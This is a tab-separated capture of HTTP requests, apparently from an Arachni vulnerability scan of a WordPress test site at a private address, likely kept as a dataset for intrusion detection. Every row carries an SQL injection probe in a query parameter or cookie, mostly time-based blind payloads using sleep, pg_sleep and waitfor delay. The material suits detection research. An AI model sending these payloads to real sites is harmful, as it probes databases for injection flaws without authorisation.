http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=-1839'+or+'1'%3D'2	/web/wp-includes/css/dashicons.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									21984						1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=-1839%22+or+%221%22%3D%222	/web/wp-includes/css/dashicons.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									21985						1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=-1839%22+or+%221%22%3D%222	/web/wp-includes/css/dashicons.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									21986						1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=-1839+or+1%3D2	/web/wp-includes/css/dashicons.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									21992						1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=-1839+or+1%3D2	/web/wp-includes/css/dashicons.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22070						1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=-1839		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=-1839
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22071						1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=-1839		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/css/dashicons.min.css?ver=-1839
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22245						1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=-1839	/web/wp-includes/css/dashicons.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22246						1	http://192.168.1.102/web/wp-includes/css/dashicons.min.css?ver=5.9		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=-1839	/web/wp-includes/css/dashicons.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22285						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%27%60--		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%27%60--
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22286						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%29		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%29
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22247						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check%22'`--	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22248						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check)	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22267						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%20and%20sleep%284%29		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%20and%20sleep%284%29
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22268						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%20or%20sleep%284%29%20%23%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%20or%20sleep%284%29%20%23%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22131						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%20and%20sleep%284%29%3D%27		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%20and%20sleep%284%29%3D%27
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22140						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%20and%20sleep%284%29%20%23%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%20and%20sleep%284%29%20%23%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22141						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%20and%20sleep%284%29%3D%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%20and%20sleep%284%29%3D%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22146						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%20or%20sleep%284%29%20%23%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%20or%20sleep%284%29%20%23%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22166						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%20or%20sleep%284%29%20%23%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%20or%20sleep%284%29%20%23%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22172						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%3Dsleep%284%29%3D%27		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%3Dsleep%284%29%3D%27
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22174						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%3Dsleep%284%29%3D%22		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%3Dsleep%284%29%3D%22
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22175						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%20where%20sleep%284%29%20%23%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%20where%20sleep%284%29%20%23%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22176						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%3Bselect%20pg_sleep%284%29%3B%20--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%3Bselect%20pg_sleep%284%29%3B%20--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22177						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%3Bselect%20pg_sleep%284%29%3B%20--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%3Bselect%20pg_sleep%284%29%3B%20--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%29%3Bselect%20pg_sleep%284%29%3B%20--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%29%3Bselect%20pg_sleep%284%29%3B%20--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%29%3Bselect%20pg_sleep%284%29%3B%20--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%29%3Bselect%20pg_sleep%284%29%3B%20--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%29%29%3Bselect%20pg_sleep%284%29%3B%20--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%29%29%3Bselect%20pg_sleep%284%29%3B%20--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%29%29%3Bselect%20pg_sleep%284%29%3B%20--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%29%29%3Bselect%20pg_sleep%284%29%3B%20--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22314						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22315						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22316						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102									22319						1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check'+or+sleep(4)+#+	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%29%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%29%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%29%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%27%29%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%29%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2%22%29%29%3Bwaitfor%20delay%20%270%3A0%3A4%27--%20
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check+and+sleep(4)	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check+or+sleep(4)+#+	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check'+and+sleep(4)%3D'	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check'+and+sleep(4)+#+	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check%22+and+sleep(4)%3D%22	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check%22+or+sleep(4)+#+	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check'%3Dsleep(4)%3D'	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip, deflate	en-US,en;q=0.8,he;q=0.6																									192.168.1.102															1	http://192.168.1.102/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2		GET				HTTP/1.1																			Arachni/v1.5.1			wordpress_test_cookie=WP+Cookie+check%22%3Dsleep(4)%3D%22	/web/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2
